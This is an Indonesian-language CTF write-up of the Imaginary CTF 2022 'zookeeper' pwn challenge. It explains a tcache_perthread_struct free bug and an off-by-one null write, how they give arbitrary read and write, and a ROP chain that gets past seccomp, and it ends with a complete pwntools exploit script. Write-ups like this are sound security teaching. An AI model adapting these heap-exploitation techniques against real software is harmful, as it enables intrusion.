---
layout: post
author: zafirr
title:  "Imaginary CTF 2022 zookeeper writeup"
description: "Active again!"
date: 2022-07-19
last_modified_at: 2022-07-19
categories: writeup
lang: id
tags:
    - pwn
    - heap exploitation
    - ctf
---

## Bahasa Indonesia
Hai hai saya kembali. Pengen aktif lagi ngeCTF. Akhir pekan kemarin (16-18 Juli 2022), saya berpartisipasi di [Imaginary CTF 2022](https://ctftime.org/event/1670) dengan tim [SEKTE GADENG](https://ctftime.org/team/160137). Lumayan hasilnya, kami berhasil mendapatkan posisi keenam. Saya berhasil menyelesaikan semua tantangan pwn, sebab tantangannya tidak begitu sulit selain 2, yaitu "zookeeper" dan "minecraft". Writeup untuk minecraft saya buat nanti, tapi pada blog ini saya mau menjelaskan cara menyelesaikan zookeeper.

### Tantangannya
Jika ingin download arsip tantangannya, klik [disini](https://drive.google.com/drive/folders/1BegWiRa2aSA6xLYj2zuvs5w5fMel4rwM?usp=sharing)

Tantangannya merupakan tantangan exploitasi heap, dimana kita diberikan tiga fungsi. Fungsinya secara garis besar adalah "Menambahkan Lion", "Menghapus Lion", dan "Melihat Lion". Sebuah (sebuah wkwkwk) "Lion" merupakan struct sebagai berikut:

![Error](/assets/images/Imaginary_CTF_2022_zookeeper/1.png)

Terdapat 2 chunk, dimana chunk pertama adalah chunk metadata yang menyimpan panjang dari nama lion, dan pointer kepada nama lion. Terdapat juga string "valid management", yang dicek ketika menghapus dan melihat sebuah lion. Chunk kedua merupakan nama lion.

Menambahakan lion merupakan fungsi sebagai berikut:

![Error](/assets/images/Imaginary_CTF_2022_zookeeper/2.png)

The function first allocate 50 bytes for the metadata chunk, then asks the user for the length of the lion name. The lion name length may be <u><b>any integer value</b></u> (this is important, keep note of it). The function then hardcodes "valid management" into the metadata chunk, and asks the user to input the lion name. The last byte of the inputted name is then set to <u><b>null</b></u> (this is also important!)

Fungsinya pertama mengalokasikan 50 byte untuk chunk metadata, lalu meminta user menginput panjang nama lion. Panjang dari nama lion boleh bernilai <u><b>integer berapapun</b></u> (hal ini penting, catat). Fungsi tersebut kemudian memasukkan "valid management" kedalam chunk metadata, dan meminta user untuk menginput nama lion. Byte terakhir dari nama yang diinput kemudian diganti jadi <u><b>null</b></u> (ini juga penting!)

Menghapus lion merupakan fungsi sebagai berikut:

![Error](/assets/images/Imaginary_CTF_2022_zookeeper/3.png)

The function takes the metadata chunk, checks if "valid management" is present, and frees the metadata chunk then the name chunk. I repeat, it frees the <u><b>metadata chunk</b></u>, then the <u><b>name chunk</b></u> (its important to keep note of this as well!)

Fungsi tersebut mengambil chunk metadata, dan memeriksa jika terdapat "valid management" didalamnya, dan melakukan free pada chunk metadata lalu chunk nama. Saya ulangi lagi, dilakukan free pada <u><b>chunk metadata</b></u>, lalu <u><b>chunk nama</b></u> (Ini juga penting untuk dicatat!)

Melihat lion merupakan fungsi sebagai berikut:

![Error](/assets/images/Imaginary_CTF_2022_zookeeper/4.png)

Seperti menghapus lion, fungsi tersebut mengambil chunk metadata, dan memeriksa jika terdapat "valid management", tetapi mencetak nama lion.

Simpel, kan? Yaaa... terdapat satu hal lagi sih.

![Error](/assets/images/Imaginary_CTF_2022_zookeeper/5.png)

Terdapat juga sebuah seccomp yang membatasi syscall yang dapat kita gunakan pada open, read, dan write. Hal ini berarti memanggil fungsi system saja belum cukup.

### Rencana exploit
Dikarenakan terdapat seccomp, cara saya menyelesaikannya adalah menggunakan ROP. Untuk melakukan itu, kita pertama membutuhkan cara untuk menulis ke stack, yang berarti kita perlu cara untuk mencetak sebuah alamat stack DAN menulis ke stack. Seperti biasa, hal tersebut berarti exploit kita akan dipecahkan menjadi 2 bagian, yaitu mendapatkan "Arbitrary Read" dan "Arbitrary Write".

Asumsikan kita sudah memiliki keduanya. Langkah selanjutnya bagaimana? Untuk mencetak alamat stack, cara yang biasanya saya lakukan adalah dengan membaca nilai "environ" yang terdapat pada stack. Untuk melakukan itu, kita perlu mencetak amat libc terlebih dahulu. Untuk mencetak alamat libc, kita dapat menggunakan nilai main_arean yang terdapat di heap setelah melakukan free pada large bin.

Itulah rencananya. Sekarang mari kita cari cara mendapatkan Arbitrary Read dan Write.

### Arbitrary Read
Rekap sedikit dengan catatan, apa hal ketiga yang saya bilang penting? Ya, urutan free chunk adalah free chunk metadata lalu chunk nama. Hal ini merupakan masalah, sebab daripada chunk nama yang di free, chunk tcache_perthread_struct di free!

Hah apaan itu tcache_perthread_struct??? Pada subsubbab berikut saya akan menjelaskan itu. Jika anda sudah tau, silakan klik [ini](#melanjutkan-arbitrary-read)

#### tcache_perthread_struct
Pada versi-versi libc terbaru, jika dilihat heap, terdapat chunk pertama yang lumayan menarik dan hampir selalu hadir. Chunk ini memiliki ukuran 0x290 (secara default), dan terstrukter sebagai berikut:

```c
# define TCACHE_MAX_BINS                64



typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

"entries", merupakan head dari masing-masing tcache freelist, dan "counts" merupakan panjang dari masing-masing freelist. Sebuah tcache_entry terstruktur sebagai berikut:

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;
```

Ini merupakan 2 word pertama pada sebuah chunk tcache yang sudah di free

Yang penting juga untuk diperhatikan merupakan bagian kode pada fungsi tacache_put (saya cuma mencetak baris-baris yang penting):

```c
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  
  e->key = tcache;
}
```

"tcache" merupakan variabel global yang menunjuk pada `tcache_perthread_struct di heap. Ini terjadi setelah melakukan free pada sebuah chunk (tidak selalu, tapi kasus spesifiknya diluar hal yang saya mau jelaskan), jadi alamat dari tcache_perthread_struct tersimpan pada word kedua pada sebuah chunk tcache yang di free. Inilah alasan mengapa melakukan free pada chunk metadata lalu chunk nama merupakan sebuah bug!

### Melanjutkan Arbitrary Read
Disebabkan kita berhasil melakukan free pada tcache_perthread_struct, kita bisa mendapatkan arbitary read. Untuk melakukan itu, kita perlu menggunakan 2 bug lainnya yang saya suruh catat.

> Ini titik yang bagus untuk berhenti sebentar jika ingin cari tau secara mandiri!

<br>

Karena kita dapat mengalokasi chunk dengan ukuran berapapun, apa yang terjadi jika kita alokasi chunk dengan ukuran 0? Ya, kita bakal mendapatkan chunk dengan ukuran 0x20. Karena ukuran yang kita input adalah 0, null byte yang ditulis oleh program bakal tertulis dimana? Yak, pada posisi -1! Hal ini berarti jika terdapat sebuah nilai yang tersimpan sebelum kita menulis ke chunk tersebut, kita dapat membaca nilai tersebut.

Bagaimana ini bisa digunakan sebagai arbitary read? Gampang, dengan menulis ke tcache_perthread_struct, kita dapat mengubah nilai head dari freelist tcache pertama (yang menangani chunk dengan ukuran 0x20), dan menggunakan trik diatas, kita dapat membaca nilai dimanapun!

Menggunakan ini, mendapatkan alamat libc dan alamat stack seharusnya gampang. Alamat stack terdapat pada environ (di libc), dan alamat libc terdapat pada sebuah large bin chunk yang sudah di free.

### Arbitrary Write
> Ini titik yang bagus untuk berhenti sebentar jika ingin cari tau secara mandiri!

<br>

Ya, harusnya sudah jelas sih cara untuk mendapatkan arbitary write. Seperti arbitrary read, kita dapat mengubah nilai dari head dari  freelist tcahce manapun, jadi tcache bin dengan ukuran 0x300 pun dapat digunakan untuk menulis kemana saja. Seperti yang sudah saya katakan sebelumnya, saya menulis ke stack untuk membuat sebuah ropchain. Menggunakan ropchain, saya membuka "flag.txt", membaca darinya, dan mencetak isi kontennya. GG!

### Exploit lengkap
Ini exploit lengkap :D

```py
from pwn import *
import codecs

libc = ELF('./libc-2.31.so')
seccomp = ELF('./libseccomp.so.2.5.1')

# p = process('./zookeeper', env={"LD_PRELOAD": libc.path + " " + seccomp.path})
p = remote("zookeeper.chal.imaginaryctf.org", 1337)

def add(idx, size, content, usecontent=True):
    p.sendlineafter("(v)iew a lion\n", "f")
    p.sendlineafter("idx:", str(idx))
    p.sendlineafter("len:", str(size))
    if(usecontent):
        p.sendlineafter("content:", content)

def lose(idx):
    p.sendlineafter("(v)iew a lion\n", "l")
    p.sendlineafter("idx:", str(idx))

def view(idx):
    p.sendlineafter("(v)iew a lion\n", "v")
    p.sendlineafter("idx:", str(idx))

# Get heap leak
add(0, 0x10, "asdf")
add(0, 0x0, "asdf", usecontent=False)
view(0)
p.recvline()
heap_leak = int(codecs.encode(p.recvline().strip()[::-1], 'hex'), 16)
print(hex(heap_leak))
heap_base = heap_leak - 0x1db0


# Free tcache_perthread_struct
add(0, 0x10, "ZAFIR_1")
lose(0)


# Get libc address leak
buf = b""
buf += p64(0x1)
buf = buf.ljust(128, b"\x00")
add(1, 0x280, buf)
add(2, 0x800, "leaker")
lose(1)

buf = b""
buf += p64(0x1)
buf = buf.ljust(128, b"\x00")
buf += p64(heap_base + 0x15a0)
add(1, 0x280, buf)

add(0, 0x0, "asdf", usecontent=False)
view(0)
libc_leak = int(codecs.encode(p.recvuntil("\x7f")[-6:][::-1], 'hex'), 16)
print(hex(libc_leak))
libc_base = libc_leak - 0x1ebbf0
lose(1)

environ = libc_base + 0x1ef2e0
open_func = libc_base + 0x110e50
read_func = libc_base + 0x111130
write_func = libc_base + 0x1111d0
pop_rdi = libc_base + 0x0000000000026b72
pop_rsi = libc_base + 0x0000000000027529
pop_rdx = libc_base + 0x0000000000162866
pop_rsp = libc_base + 0x0000000000032b5a
ret = libc_base + 0x0000000000025679
pop_rcx = libc_base + 0x00000000001056fe
syscall = libc_base + 0x000000000011b880


# Get stack address leak
buf = b""
buf += p64(0x1)
buf = buf.ljust(128, b"\x00")
buf += p64(environ)
add(1, 0x280, buf)

add(0, 0, "asdf", usecontent=False)
view(0)
stack_leak = int(codecs.encode(p.recvuntil("\x7f")[-6:][::-1], 'hex'), 16)
print(hex(stack_leak))
lose(1)


## ROP chain!
buf = b""
buf += p64(0)*2 + p64(0x0101010101010101)*6
buf = buf.ljust(128, b"\x00")
buf += p64(stack_leak-0x158)*32
add(1, 0x280, buf)
add(0, 0x130, p64(ret)*10 + p64(pop_rsi) + p64(stack_leak-0xd8) + p64(pop_rdx) + p64(0)*2 + p64(pop_rcx) + b"flag.txt" + p64(0) + p64(pop_rdi) + p64(2) + p64(syscall) + 
    p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(stack_leak) + p64(pop_rdx) + p64(0x1000)*2 + p64(read_func) + 
    p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(stack_leak) + p64(pop_rdx) + p64(0x50)*2 + p64(write_func))

p.interactive()
```

Terima kasih telah membaca :)

